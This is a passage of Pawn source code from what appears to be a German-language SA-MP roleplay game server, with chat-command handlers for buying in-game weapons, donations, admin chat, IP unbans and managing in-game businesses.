						SendClientMessage(playerid, COLOR_GRAD2, string);
					}
	            }
            }
            else
	        {
	            SendClientMessage(playerid, COLOR_GREY, "   Du bist kein Admin ! ");
	            return 1;
	        }
	    }
	    return 1;
	}
*/
	if(strcmp(cmd, "/spende", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD1, "NUTZUNG: /spende [betrag]");
				return 1;
			}
			if(PlayerInfo[playerid][pLocal] == 106)
			{
				SendClientMessage(playerid, COLOR_GRAD1, "Der Befehl ist in dieser Lage nicht erlaubt");
				return 1;
			}
			moneys = strval(tmp);
			if(moneys < 999)
			{
				SendClientMessage(playerid, COLOR_GRAD1, "Du kannst nur eine Spende ab $1000 machen!");
				return 1;
			}
			if(GetPlayerMoneySave(playerid) < moneys)
			{
			    SendClientMessage(playerid, COLOR_GRAD1, "Du hast nicht so viel Geld bei dir.");
				return 1;
			}
			GivePlayerMoneySave(playerid, -moneys);
			GetPlayerName(playerid, sendername, sizeof(sendername));
			format(string, sizeof(string), "Du hast $%d an den Staat Gespendet! Danke das wir dich ausnehmen können.",moneys);
			SCM(playerid,-1,string);
			PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
			PayLog(string);
			FraktionsKasse[6] += moneys;     //Fraktion  7
		}
		return 1;
    	}

        if (strcmp(cmd, "/buygun", true) == 0)
        {
            if(IsPlayerConnected(playerid))
           	{
                if(GetPlayerMoneySave(playerid) < 1)
                        {
                            SendClientMessage(playerid, COLOR_GREY, "   Du hast nicht genug Geld !");
                            return 1;
                        }
                        if(PlayerInfo[playerid][pGunLic] == 0)
                        {
                                SendClientMessage(playerid, COLOR_GREY, "   Du hast keinen Waffenschein !");
                            return 1;
                        }
                        new gun;
                        new gunid[16];
                        new gunstring1[256];
                        new gunstring2[256];
                        new gunstring3[256];
                        new gunstring4[256];
                        new gunstring5[256];
                        new infostring[256];
                        new guncharge;
                        new ammocharge;
						new location = PlayerInfo[playerid][pLocal];
//                        if(location == 99 || location == 100 || location == 102 || location == 105|| location == 104)
//                        {
                       	if(PlayerInfo[playerid][pBizID] == 1)
                        {
                            if(BizzInfo[location-99][bProducts] <= 0)
                            {
                                GameTextForPlayer(playerid, "~r~Ausverkauft", 5000, 1);
                                        return 1;
                            }
                                new mod2 = 100;
                                tmp = strtoknew(cmdtext, idx);
                                if(!strlen(tmp))
                                {
                                        format(string, sizeof(string), "Benutzung: /buygun [waffenname] [munition]");
                                        SendClientMessage(playerid, COLOR_GREEN,"_______________________________________");
                                        SendClientMessage(playerid, COLOR_WHITE,"*** Waffen & Munition ***");
                                        SendClientMessage(playerid, COLOR_GRAD2,string);
                                        format(gunstring1, 256, "Waffen: Fallschirm ($%d) Golfschläger ($%d) Schlagstock ($%d) Baseballschläger ($%d) Schaufel ($%d) Poolcue ($%d)",
                                        GunPrice[0][0]/70*mod2,GunPrice[1][0]/70*mod2,GunPrice[2][0]/70*mod2,GunPrice[3][0]/70*mod2,GunPrice[4][0]/70*mod2,GunPrice[5][0]/70*mod2,GunPrice[6][0]/70*mod2);
                                        SendClientMessage(playerid, COLOR_GRAD3, gunstring1);
                                        format(gunstring2, 256, "Waffen: Violetterdildo ($%d) Weißerdildo ($%d) Langerweißerdildo ($%d) Weißerdildo2 ($%d) Blumen ($%d) cane",
                                        GunPrice[7][0]/70*mod2,GunPrice[8][0]/70*mod2,GunPrice[9][0]/70*mod2,GunPrice[10][0]/70*mod2,GunPrice[11][0]/70*mod2,GunPrice[12][0]/70*mod2);
                                        SendClientMessage(playerid, COLOR_GRAD3, gunstring2);
                                        format(gunstring3, 256, "Waffen: SD-Pistole ($%d) Deagle ($%d) MP5 ($%d)",
                                        GunPrice[13][0]/70*mod2,GunPrice[14][0]/70*mod2,GunPrice[15][0]/70*mod2,GunPrice[16][0]/70*mod2,GunPrice[17][0]/70*mod2,GunPrice[18][0]/70*mod2);
                                        SendClientMessage(playerid, COLOR_GRAD3, gunstring3);
                                        format(gunstring4, 256, "Waffen: Shotgun ($%d) AK47 ($%d) M4 ($%d) Rifle ($%d)",
                                        GunPrice[19][0]/70*mod2,GunPrice[20][0]/70*mod2,GunPrice[21][0]/70*mod2,GunPrice[22][0]/70*mod2,GunPrice[23][0]/70*mod2,GunPrice[24][0]/70*mod2);
                                        SendClientMessage(playerid, COLOR_GRAD3, gunstring4);
                                        format(gunstring5, 256, "Waffen: Pistolen Munition ($%d) Shotgun Munition ($%d) MP5 Munition ($%d) AK47/M4 Munition ($%d) Sniper Munition ($%d)",
                                        GunPrice[25][0],GunPrice[26][0],GunPrice[27][0],GunPrice[28][0],GunPrice[29][0]);
                                        SendClientMessage(playerid, COLOR_GRAD3, gunstring5);
                                        SendClientMessage(playerid, COLOR_GREEN,"_______________________________________");
                                        return 1;
                                }
                                strmid(gunid, tmp, 0, strlen(cmdtext), 255);
                                tmp = strtoknew(cmdtext, idx);
                                if(!strlen(tmp))
                                {
                                        format(string, sizeof(string), "BENUTZUNG: /buygun [Waffe] [Munition]");
                                        return 1;
                                }
                                new ammo = strval(tmp);
                                if(ammo < 1 || ammo > 999) { SendClientMessage(playerid, COLOR_GREY, "   Die Munition muss zwischen 1 und 999 sein !"); return 1; }
                                if (strcmp(gunid, "Fallschirm", true, strlen(gunid)) == 0)
                                {
                                        gun = 46;
                                        guncharge = GunPrice[0][0]/70*mod2;
                                        ammocharge = 0;
                                }
                                else if (strcmp(gunid, "Golfschläger", true, strlen(gunid)) == 0)
                                {
                                        gun = 2; guncharge = GunPrice[1][0]/70*mod2; ammocharge = 0;
                                        PlayerInfo[playerid][pGun1] = 2; PlayerInfo[playerid][pAmmo1] = 1;
                                }
                                else if (strcmp(gunid, "Schlagstock", true, strlen(gunid)) == 0)
                                {
                                        gun = 3; guncharge = GunPrice[2][0]/70*mod2; ammocharge = 0;
                                        PlayerInfo[playerid][pGun1] = 3; PlayerInfo[playerid][pAmmo1] = 1;
                                }
                                else if (strcmp(gunid, "Baseballschläger", true, strlen(gunid)) == 0)
                                {
                                        gun = 5; guncharge = GunPrice[4][0]/70*mod2; ammocharge = 0;
                                        PlayerInfo[playerid][pGun1] = 5; PlayerInfo[playerid][pAmmo1] = 1;
                                }
                                else if (strcmp(gunid, "Schaufel", true, strlen(gunid)) == 0)
                                {
                                        gun = 6; guncharge = GunPrice[5][0]/70*mod2; ammocharge = 0;
                                        PlayerInfo[playerid][pGun1] = 6; PlayerInfo[playerid][pAmmo1] = 1;
                                }
                                else if (strcmp(gunid, "poolcue", true, strlen(gunid)) == 0)
                                {
                                        gun = 7; guncharge = GunPrice[6][0]/70*mod2; ammocharge = 0;
                                        PlayerInfo[playerid][pGun1] = 7; PlayerInfo[playerid][pAmmo1] = 1;
                                }
                                else if (strcmp(gunid, "VioletterDildo", true, strlen(gunid)) == 0)
                                {
                                        gun = 10; guncharge = GunPrice[7][0]/70*mod2; ammocharge = 0;
                                        PlayerInfo[playerid][pGun1] = 10; PlayerInfo[playerid][pAmmo1] = 1;
                                }
                                else if (strcmp(gunid, "Weißerdildo", true, strlen(gunid)) == 0)
                                {
                                        gun = 11; guncharge = GunPrice[8][0]/70*mod2; ammocharge = 0;
                                        PlayerInfo[playerid][pGun1] = 11; PlayerInfo[playerid][pAmmo1] = 1;
                                }
                                else if (strcmp(gunid, "langerweißerdildo", true, strlen(gunid)) == 0)
                                {
                                        gun = 12; guncharge = GunPrice[9][0]/70*mod2; ammocharge = 0;
                                        PlayerInfo[playerid][pGun1] = 12; PlayerInfo[playerid][pAmmo1] = 1;
                                }
                                else if (strcmp(gunid, "weißerdildo2", true, strlen(gunid)) == 0)
                                {
                                        gun = 13; guncharge = GunPrice[10][0]/70*mod2; ammocharge = 0;
                                        PlayerInfo[playerid][pGun1] = 13; PlayerInfo[playerid][pAmmo1] = 1;
                                }
                                else if (strcmp(gunid, "Blumen", true, strlen(gunid)) == 0)
                                {
                                        gun = 14; guncharge = GunPrice[11][0]/70*mod2; ammocharge = 0;
                                        PlayerInfo[playerid][pGun1] = 14; PlayerInfo[playerid][pAmmo1] = 1;
                                }
                                else if (strcmp(gunid, "cane", true, strlen(gunid)) == 0)
                                {
                                        gun = 15; guncharge = GunPrice[12][0]/70*mod2; ammocharge = 0;
                                        PlayerInfo[playerid][pGun1] = 15; PlayerInfo[playerid][pAmmo1] = 1;
                                }
                                else if (strcmp(gunid, "SD-Pistole", true, strlen(gunid)) == 0)
                                {
                                        gun = 23; guncharge = GunPrice[13][0]/70*mod2; ammocharge = GunPrice[25][0]*ammo;
                                        PlayerInfo[playerid][pGun2] = 23; PlayerInfo[playerid][pAmmo2] = ammo;
                                }
                                else if (strcmp(gunid, "Deagle", true, strlen(gunid)) == 0)
                                {
                                        gun = 24; guncharge = GunPrice[15][0]/70*mod2; ammocharge = GunPrice[25][0]*ammo;
                                        PlayerInfo[playerid][pGun2] = 24; PlayerInfo[playerid][pAmmo2] = ammo;
                                }
                                else if (strcmp(gunid, "MP5", true, strlen(gunid)) == 0)
                                {
                                        gun = 29; guncharge = GunPrice[18][0]/70*mod2; ammocharge = GunPrice[27][0]*ammo;
                                        PlayerInfo[playerid][pGun3] = 29; PlayerInfo[playerid][pAmmo3] = ammo;
                                }
                                else if (strcmp(gunid, "Shotgun", true, strlen(gunid)) == 0)
                                {
                                        gun = 25; guncharge = GunPrice[19][0]/70*mod2; ammocharge = GunPrice[26][0]*ammo;
                                        PlayerInfo[playerid][pGun3] = 25; PlayerInfo[playerid][pAmmo3] = ammo;
                                }
                                else if (strcmp(gunid, "AK47", true, strlen(gunid)) == 0)
                                {
                                        gun = 30; guncharge = GunPrice[22][0]/70*mod2; ammocharge = GunPrice[28][0]*ammo;
                                        PlayerInfo[playerid][pGun4] = 30; PlayerInfo[playerid][pAmmo4] = ammo;
                                }
                                else if (strcmp(gunid, "M4", true, strlen(gunid)) == 0)
                                {
                                        gun = 31; guncharge = GunPrice[23][0]/70*mod2; ammocharge = GunPrice[28][0]*ammo;
                                        PlayerInfo[playerid][pGun4] = 31; PlayerInfo[playerid][pAmmo4] = ammo;
                                }
                                else if (strcmp(gunid, "Sniper", true, strlen(gunid)) == 0)
                                {
                                        gun = 33; guncharge = GunPrice[24][0]/70*mod2; ammocharge = GunPrice[29][0]*ammo;
                                        PlayerInfo[playerid][pGun4] = 33; PlayerInfo[playerid][pAmmo4] = ammo;
                                        SCM(playerid,-1,"AmmunationTyp: Gescammt! Hahahaha");
                                }
                                else
                                {
                                        SendClientMessage(playerid, COLOR_GRAD6, "Ladenbesitzer: Ich habe noch nie von dieser Waffe gehört.");
                                        return 1;
                                }
                                if((guncharge+ammocharge) > GetPlayerMoneySave(playerid))
                                {
                                        format(infostring, 256, "   Du hast nicht $%d !",guncharge+ammocharge);
                                        SendClientMessage(playerid, COLOR_GRAD3, infostring);
                                        return 1;
                                }
                                if(GetPlayerMoneySave(playerid) < (guncharge+ammocharge))
                                {
                                    SendClientMessage(playerid, COLOR_GREY, "   Geht nicht !");
                                    return 1;
                                }
                                new payout = guncharge + ammocharge;
                                format(infostring, 256, "Du hast eine %s mit %d Munition für $%d erworben",gunid,ammo,payout);
                                SendClientMessage(playerid, COLOR_GRAD3, infostring);
                                if(location == 102 && !IsACop(playerid)) { }
                                else
                                {
                                        SendClientMessage(playerid, COLOR_WHITE,"Für Mitglieder einer Staatlichen Fraktion sind die Waffen Kostenlos.");
                                        GivePlayerMoneySave(playerid, - payout);
                                }
                                BizzInfo[location-99][bTill] += payout;
                                ExtortionBiz(location-99, payout);
                                BizzInfo[location-99][bProducts]--;
                                PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
                                ServerWeapon(playerid, gun, ammo);
                                GetPlayerName(playerid, sendername, sizeof(sendername));
                                format(string, sizeof(string), "%s hat Waffen für $%d eingekauft Am BIZ: %d", sendername, payout, location-99);
                                printf("%s", string);
                                PayLog(string);
                        }
                        else
                        {
                            SendClientMessage(playerid, COLOR_GRAD2,"Du bist in keinem Waffenladen!");
                                return 1;
                        }
                }
                return 1;
    }
    if(strcmp(cmd, "/givegun", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            tmp = strtoknew(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_RED, "FEHLER: /givegun [SpielerID] [WaffenID] [Munition]");
                return 1;
            }
            new playa;
            new gun;
            new ammo;
            playa = ReturnUser(tmp);
            tmp = strtoknew(cmdtext, idx);
            gun = strval(tmp);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_RED, "FEHLER: /givegun [SpielerID] [WaffenID] [Munition]");
                SendClientMessage(playerid, COLOR_GRAD4, "3(Club) 4(knife) 5(bat) 6(Shovel) 7(Cue) 8(Katana) 10-13(Dildo) 14(Flowers)18(Molotovs) 22(Pistol) 23(SPistol)");
                SendClientMessage(playerid, COLOR_GRAD3, "24(Deagle) 25(Schrott) 29(MP5) 30(AK47) 31(M4) 33(Rifle) 34(Sniper)41(spray) 42(exting) 43(Camera) 46()");
                return 1;
            }
            tmp = strtoknew(cmdtext, idx);
            ammo = strval(tmp);
            if(ammo <1||ammo > 999)
            { SendClientMessage(playerid, COLOR_GRAD1, "   Nicht weniger als 1 oder mehr als 999 Munition!"); return 1; }
            if (PlayerInfo[playerid][pAdmin] == 2002)
            {
                if(IsPlayerConnected(playa))
                {
                    if(playa != INVALID_PLAYER_ID)
                    {
                        ServerWeapon(playa, gun, ammo);
                    }
                }
            }
            else
            {
                SendClientMessage(playerid, COLOR_GRAD1, "   Du darfst diesen Befehl nicht benutzen!");
            }
        }
        return 1;
    }


	if(strcmp(cmd, "/setworld", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, COLOR_GRAD2, " /setworld [playerid/PartOfName] [virworldid]");
				return 1;
			}
			new playa;
			playa = ReturnUser(tmp);
			new virid;
			tmp = strtoknew(cmdtext, idx);
			virid = strval(tmp);
			if (PlayerInfo[playerid][pAdmin] >= 4)
			{
			    if(IsPlayerConnected(playa))
			    {
			        if(playa != INVALID_PLAYER_ID)
			        {
						SetPlayerVirtualWorld(playa, virid);
						format(string, sizeof(string), "   Du hast die Viruale Welt von %s auf %d gesetzt.", GetName(giveplayerid), virid);
						SendClientMessage(playerid, COLOR_GRAD1, string);
						format(string, sizeof(string), "   %s hat deine Virtuale Welt auf %d gesetzt.", GetName(playerid), virid);
						SendClientMessage(playa, COLOR_GRAD1, string);
					}
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD1, "Du darfst dieses Befehl nicht benutzen !");
			}
		}
		return 1;
	}

	if(strcmp(cmd, "/erstehilfe", true) == 0)
	{
	    if(PlayerInfo[playerid][pErstehilfe] == 1)
	    {
                    format(string, sizeof(string), "* %s Benutzt ein Erstehilfe Paket und versorgt die Wunden!", sendername);
                    ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		            SetPlayerHealth(playerid,100);
                    PlayerInfo[playerid][pErstehilfe] = 0;
        }
	   else{SendClientMessage(playerid, COLOR_GRAD1, "Du hast kein Erstehilfe Paket!");
	}
	return 1;
	}
    if(strcmp(cmd,"/setrangname",true) == 0)
    {
		if(IsPlayerConnected(playerid))
        {
            if (PlayerInfo[playerid][sMember]==0)
            {
				SCM(playerid, COLOR_GRAD1, "* Zivilisten können keine Rangnamen ändern!");
				return 1;
			}
			else
			{
				if(PlayerInfo[playerid][pRank]==12)
				{
				    new string2[2048];
					format(string2,sizeof(string2),"Rank 1: %s\nRank 2: %s\nRank 3: %s\nRank 4: %s\nRank 5: %s\nRank 6: %s\nRank 7: %s\nRank 8: %s\nRank 9: %s\nRank 10: %s\nRank 11: %s\nRank 12: %s",Rangname[PlayerInfo[playerid][sMember]][Rang1],Rangname[PlayerInfo[playerid][sMember]][Rang2],Rangname[PlayerInfo[playerid][sMember]][Rang3],Rangname[PlayerInfo[playerid][sMember]][Rang4],
					Rangname[PlayerInfo[playerid][sMember]][Rang5],Rangname[PlayerInfo[playerid][sMember]][Rang6],Rangname[PlayerInfo[playerid][sMember]][Rang7],Rangname[PlayerInfo[playerid][sMember]][Rang8],Rangname[PlayerInfo[playerid][sMember]][Rang9],Rangname[PlayerInfo[playerid][sMember]][Rang10],Rangname[PlayerInfo[playerid][sMember]][Rang11],Rangname[PlayerInfo[playerid][sMember]][Rang12]);
				    ShowPlayerDialog(playerid, DIALOG_RANGNAME, DIALOG_STYLE_LIST, "Ränge Verwalten", string2, "Ändern", "Verlassen");
				    return 1;
				}
				else
				{
					SCM(playerid, COLOR_GRAD1, "* Nur Mitglieder ab Rank 12 können Rangnamen ändern!");
					return 1;
				}
			}
        }
        return 1;
	}
	if(strcmp(cmd, "/admin", true) == 0 || strcmp(cmd, "/a", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
			GetPlayerName(playerid, sendername, sizeof(sendername));
			new length = strlen(cmdtext);
			while ((idx < length) && (cmdtext[idx] <= ' '))
			{
				idx++;
			}
			new offset = idx;
			new result[90];
			while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
			{
				result[idx - offset] = cmdtext[idx];
				idx++;
			}
			result[idx - offset] = EOS;
			if(!strlen(result))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "NUTZE: (/a)dmin [admin chat]");
				return 1;
			}
			if (PlayerInfo[playerid][pAdmin] >= 2005)
			{
				format(string, sizeof(string), "* UC-Admin %s: %s", sendername, result);
			}
			else if (PlayerInfo[playerid][pAdmin] >= 2002)
			{
				format(string, sizeof(string), "* Projektleitung %s: %s", sendername, result);
			}
			else if (PlayerInfo[playerid][pAdmin] >= 2001)
			{
				format(string, sizeof(string), "* Stellv. Projektleitung %s: %s", sendername, result);
			}
			else if (PlayerInfo[playerid][pAdmin] >= 2000)
			{
				format(string, sizeof(string), "* Head-Admin %s: %s", sendername, result);
			}
			else if(PlayerInfo[playerid][pAdmin] >= 1338)
            {
				format(string, sizeof(string), "* Admin %s: %s", sendername, result);
			}
			else if(PlayerInfo[playerid][pAdmin] >= 1337)
            {
				format(string, sizeof(string), "* Moderator %s: %s", sendername, result);
			}
			else if(PlayerInfo[playerid][pAdmin] >= 4)
            {
				format(string, sizeof(string), "* Supporter %s: %s", sendername, result);
			}
			else if(PlayerInfo[playerid][pAdmin] >= 2)
            {
				format(string, sizeof(string), "* Communityhelfer %s: %s", sendername, result);
			}
			else if(PlayerInfo[playerid][pAdmin] == 0 && PlayerInfo[playerid][pSupporter] == 0)
            {
				if(PlayerInfo[playerid][paMuted] == 1)
	            {
					new stringd[128];
	                format(stringd, sizeof(stringd), "Du bist noch für %d Minuten vom Support System ausgeschlossen!", PlayerInfo[playerid][paMutedTime]);
	            	SendClientMessage(playerid, COLOR_GRAD2, stringd);
					return 1;
				}
				format(string, sizeof(string), "* Spieler (%d) %s: %s", playerid,sendername, result);
				SendClientMessageEx(playerid,COLOR_YELLOW,string);
			}
			else return 1;
			for(new i=0; i<GetMaxPlayers(); i++)
			{
			    if(IsPlayerConnected(i))
			    {
			        if(PlayerInfo[i][pSupporter] >= 1 || PlayerInfo[i][pAdmin] >= 1)
			        {
			            SendClientMessageEx(i,COLOR_YELLOW,string);
			        }
			    }
			}
			Log("OA-Chat.txt",string);
		}
		return 1;
	}
	if(strcmp(cmdtext,"/disablereg",true) == 0)
	{
		if(PlayerInfo[playerid][pAdmin] < 6) return 1;
		if(disablereg == true)
		{
		    disablereg = false;
		    SCMTA(COLOR_LIGHTRED, "Die Registration wurde deaktiviert!");
		    return 1;
		}
		else
		{
		    disablereg = true;
		    SCMTA(COLOR_LIGHTRED, "Die Registration wurde wieder aktiviert!");
		    return 1;
		}
	}
	if(strcmp(cmd, "/deletefsperre", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
				tmp = strtoknew(cmdtext, idx);
				if(!strlen(tmp))
				{
					SendClientMessage(playerid, COLOR_GRAD1, "FEHLER: /show [playerid]");
					return 1;
				}
		        giveplayerid = ReturnUser(tmp);
				if (IsPlayerConnected(giveplayerid))
				{
				    if(giveplayerid != INVALID_PLAYER_ID)
				    {
                     SendClientMessage(playerid, COLOR_WHITE, "Sperre entfernt! ");
					 PlayerInfo[giveplayerid][pFrakSperre] = 0;
					}
				}
				else
				{
				    SendClientMessage(playerid, COLOR_GREY, "   Fehler !");
				    return 1;
				}
			}
		return 1;
	}

    if(strcmp(cmd,"/unbanip",true)==0)
	{
		if(PlayerInfo[playerid][pAdmin] >= 5)
		{
		    tmp = strtoknew(cmdtext,idx);
		    if(!strlen(tmp))
		    {
		        SCM(playerid,COLOR_RED,"Verwendung /unbanip [IP]");
		        return 1;
   			}

			format(string,sizeof(string),"unbanip %s",tmp);
			SendRconCommand(string);
			SendRconCommand("reloadbans");
   			GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
			GetPlayerName(playerid, sendername, sizeof(sendername));
			format(string, 256, "AdmWarning: %s hat die IP %s entbannt!", sendername,tmp);
			ABroadCast(COLOR_LIGHTRED,string,1);
		}
		return 1;
	}
    if(strcmp(cmd, "/bizname", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            new bouse = PlayerInfo[playerid][pPbiskey];
            if (bouse == 255)
            {
                SCM(playerid, COLOR_GRAD2, "Dir gehört kein Geschäft");
                return 1;
            }
            new length = strlen(cmdtext);
            while ((idx < length) && (cmdtext[idx] <= ' '))
            {
                idx++;
            }
            new offset = idx;
            new result[64];
            while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
            {
                result[idx - offset] = cmdtext[idx];
                idx++;
            }
            result[idx - offset] = EOS;
            if(!strlen(result))
            {
                SCM(playerid, COLOR_RED, "Verwendung /bizname [Name]");
            }
            if(strfind(result,"'",true) != -1) {
        		return SCM(playerid,COLOR_RED,"Das Zeichen ' darf nicht verwendet werden.");
			}
			if (bouse >= 100)
	        {
	            strmid(SBizzInfo[bouse-100][sbMessage], result, 0, 64, 255);
	            format(string, sizeof(string), "Business name wurde auf %s geändert",SBizzInfo[bouse-100][sbMessage]);
	            OnPropUpdate_sb(bouse-100);
	        }
	        else
	        {
	            strmid(BizzInfo[bouse][bMessage], result, 0, 64, 255);
	            format(string, sizeof(string), "Business name wurde auf %s geändert",BizzInfo[bouse][bMessage]);
	            OnPropUpdate_b(bouse);
            }
            SCM(playerid, COLOR_WHITE, string);
        }
        return 1;
    }
    if(strcmp(cmd, "/bizwithdraw", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            new bouse = PlayerInfo[playerid][pPbiskey];
            if (bouse == 255)
            {
                SCM(playerid, COLOR_GRAD2, "   Dir gehört kein Geschäft");
                return 1;
            }
            tmp = strtoknew(cmdtext, idx);
            if(!strlen(tmp))
            {
                if (bouse >= 100)
                {
                    format(string, sizeof(string), "  Du hast $%d in deiner Kasse.", SBizzInfo[bouse-100][sbTill]);
                    SCM(playerid, COLOR_GRAD3, string);
                }
                else
                {
                    format(string, sizeof(string), "  Du hast $%d in deiner Kasse.", BizzInfo[bouse][bTill]);
                    SCM(playerid, COLOR_GRAD3, string);
                }
                SCM(playerid, COLOR_GRAD2, "Verwendung /bizwithdraw [betrag]");
                return 1;
            }
            new cashdeposit = strval(tmp);
            if(!strlen(tmp))
            {
                SCM(playerid, COLOR_GRAD2, "Verwendung /bizwithdraw [betrag]");
                return 1;
            }
            if (bouse >= 100)
            {
                if(cashdeposit > SBizzInfo[bouse-100][sbTill] || cashdeposit < 1)
                {
                    SCM(playerid, COLOR_GRAD2, "   Du hast nicht so viel");
                    return 1;
                }
            }
            else
            {
                if (cashdeposit > BizzInfo[bouse][bTill] || cashdeposit < 1)
                {
                    SCM(playerid, COLOR_GRAD2, "   Du hast nicht so viel");
                    return 1;
                }
            }
            if (bouse >= 100)
            {
                if(!IsPlayerInRangeOfPoint(playerid,1,SBizzInfo[bouse-100][sbEntranceX],SBizzInfo[bouse-100][sbEntranceY],SBizzInfo[bouse-100][sbEntranceZ]))
                {
                    SCM(playerid, COLOR_GRAD2, "   Du bist zu weit von deinem Geschäft entfernt");
                    return 1;
                }
                else
                {
                    ConsumingMoney[playerid] = 1;
					GivePlayerMoneySave(playerid, cashdeposit);
//                    PlayerMoney[playerid] = PlayerMoney[playerid]+cashdeposit;
                    SBizzInfo[bouse-100][sbTill] -= cashdeposit;
                    format(string, sizeof(string), " Du hast $%d aus deiner Kasse genommen Total: €%d", cashdeposit,SBizzInfo[bouse-100][sbTill]);
                    OnPropUpdate_sb(bouse-100);
                    SCM(playerid, COLOR_YELLOW, string);
                    return 1;
                }
            }
            else
            {
                if (!IsPlayerInRangeOfPoint(playerid,1,BizzInfo[bouse][bExitX],BizzInfo[bouse][bExitY],BizzInfo[bouse][bExitZ]))
                {
                    SCM(playerid, COLOR_GRAD2, "   Du bist zu weit von deinem Geschäft entfernt");
                    return 1;
                }
                else
                {
                    ConsumingMoney[playerid] = 1;
					GivePlayerMoneySave(playerid, cashdeposit);
//                    PlayerMoney[playerid] = PlayerMoney[playerid]+cashdeposit;
                    BizzInfo[bouse][bTill] -= cashdeposit;
                    format(string, sizeof(string), " Du hast $%d aus deiner Kasse genommen Total: $%d", cashdeposit,BizzInfo[bouse][bTill]);
                    OnPropUpdate_b(bouse);
                    SCM(playerid, COLOR_YELLOW, string);
                    return 1;
                }
            }
        }
        return 1;
    }
    if(strcmp(cmd, "/bizbank", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            new bouse = PlayerInfo[playerid][pPbiskey];
            if (bouse == 255)
            {
                SCM(playerid, COLOR_GRAD2, "   Dir gehört kein Geschäft");
                return 1;
            }
            tmp = strtoknew(cmdtext, idx);
            if(!strlen(tmp))
            {
                if (bouse >= 100)
                {
                    format(string, sizeof(string), "  Du hast $%d in deiner Kasse.", SBizzInfo[bouse-100][sbTill]);
                    SCM(playerid, COLOR_GRAD3, string);
                }
                else
                {
                    format(string, sizeof(string), "  Du hast $%d in diener Kasse.", BizzInfo[bouse][bTill]);
                    SCM(playerid, COLOR_GRAD3, string);
                }
                SCM(playerid, COLOR_GRAD2, "Verwendung /bizbank [betrag]");
                return 1;
            }
            new cashdeposit = strval(tmp);
            if(!strlen(tmp))
            {
                SCM(playerid, COLOR_GRAD2, "Verwendung /bizbank [betrag]");
                SCM(playerid, COLOR_GRAD3, string);
                return 1;
            }
			if (cashdeposit > GetPlayerMoneySave(playerid) || cashdeposit < 1)
			{
                SCM(playerid, COLOR_GRAD2, "   Du hast nicht so viel");
                return 1;
            }
            if (bouse >= 100)
            {
                if(!IsPlayerInRangeOfPoint(playerid,1,SBizzInfo[bouse-100][sbEntranceX],SBizzInfo[bouse-100][sbEntranceY],SBizzInfo[bouse-100][sbEntranceZ]))
                {
                    SCM(playerid, COLOR_GRAD2, "   Du bist zu weit von deinem Geschäft entfernt");
                    return 1;
                }
                else
                {
					GivePlayerMoneySave(playerid, -cashdeposit);
//                    PlayerMoney[playerid] = PlayerMoney[playerid]-cashdeposit;
                    SBizzInfo[bouse-100][sbTill] += cashdeposit;
                    ExtortionSBiz(bouse-100, cashdeposit);
                    format(string, sizeof(string), "  Du hast $%d in die Kasse getan Total: $%d ", cashdeposit,SBizzInfo[bouse-100][sbTill]);
                    OnPropUpdate_sb(bouse-100);
                    SCM(playerid, COLOR_YELLOW, string);
                    return 1;
                }
            }
            else
            {
                if (!IsPlayerInRangeOfPoint(playerid,1,BizzInfo[bouse][bExitX],BizzInfo[bouse][bExitY],BizzInfo[bouse][bExitZ]))
                {
                    SCM(playerid, COLOR_GRAD2, "   Du bist zu weit von deinem Geschäft entfernt");
                    return 1;
                }
                else
                {
					GivePlayerMoneySave(playerid, -cashdeposit);
//                    PlayerMoney[playerid] = PlayerMoney[playerid]-cashdeposit;
                    BizzInfo[bouse][bTill] += cashdeposit;
                    ExtortionBiz(bouse, cashdeposit);
                    format(string, sizeof(string), "  Du hast $%d in die Kasse getan Total: $%d ", cashdeposit,BizzInfo[bouse][bTill]);
                    OnPropUpdate_b(bouse);
                    SCM(playerid, COLOR_YELLOW, string);
                    return 1;
                }
            }
        }
        return 1;
    }
    if (strcmp(cmd, "/bizinfo", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            new bouse = PlayerInfo[playerid][pPbiskey];
            if(bouse == 255)
            {
                SCM(playerid, COLOR_GRAD2, "Dir gehört kein Geschäft.");
                return 1;
            }
            if (bouse >= 100)
            {

                PrintSBizInfo(playerid,bouse-100);
            }
            else
            {
                PrintBizInfo(playerid,bouse);
            }
        }
        return 1;
    }






    if(strcmp(cmd, "/tprodprice", true) == 0)
    {
        new bouse = PlayerInfo[playerid][pPtankekey];
        if (bouse == 255)
        {
            SCM(playerid, COLOR_GRAD2, "   Dir gehört keine Tanke!");
            return 1;
        }
        tmp = strtoknew(cmdtext, idx);
        if(!strlen(tmp))
        {
            SCM(playerid, COLOR_RED, "Verwendung /tprodprice [kosten pro Produkt]");
        }
        if(strval(tmp) < 3 || strval(tmp) > 10)
        {
            SCM(playerid, COLOR_WHITE, "Minimum betrag lautet $3, Maximum betrag lautet $10.");
            return 1;
        }

	        if(strval(tmp) > TankeInfo[bouse][tTill])
	        {
	            SCM(playerid, COLOR_WHITE, "Die Tankstellenkasse ist Leer!.");
	            return 1;
	        }
	        TankeInfo[bouse][tPriceProd] = strval(tmp);
	        format(string, sizeof(string), "Du hast den Preis für den Benzinlieferranten pro Liter auf %d$ gesetzt.", TankeInfo[bouse][tPriceProd]);
	        OnPropUpdate_t(bouse);

        SCM(playerid, COLOR_WHITE, string);
        return 1;
    }

